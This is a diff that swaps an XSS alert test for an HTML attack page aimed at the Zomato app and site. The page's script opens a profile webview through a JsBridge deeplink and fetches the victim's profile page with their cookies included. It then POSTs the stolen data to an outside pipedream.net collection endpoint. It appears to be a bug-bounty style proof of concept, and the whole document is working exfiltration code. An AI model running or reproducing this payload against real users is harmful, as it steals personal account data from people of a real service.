@@ -1,1 +1,26 @@
-<script>alert(document.domain)</script>
+<html><body>
+<script>
+  // Step 1 - trigger PII webview via JsBridge
+  try {
+    window.JsBridge.openDeeplink(
+      "zomato://webview?url=https://www.zomato.com/webroutes/getPage?page_url=/profile"
+    );
+  } catch(e) {
+    document.body.innerHTML = "JsBridge error: " + e;
+  }
+
+  // Step 2 - also try direct fetch and exfil to requestbin
+  fetch("https://www.zomato.com/webroutes/getPage?page_url=/profile", {
+    credentials: "include"
+  })
+  .then(r => r.text())
+  .then(data => {
+    fetch("https://eomfuajl79ed6za.m.pipedream.net", {
+      method: "POST",
+      body: data
+    });
+    document.body.innerHTML = "Exfil sent: " + data;
+  })
+  .catch(e => document.body.innerHTML = "Fetch error (CORS?): " + e);
+</script>
+</body></html>
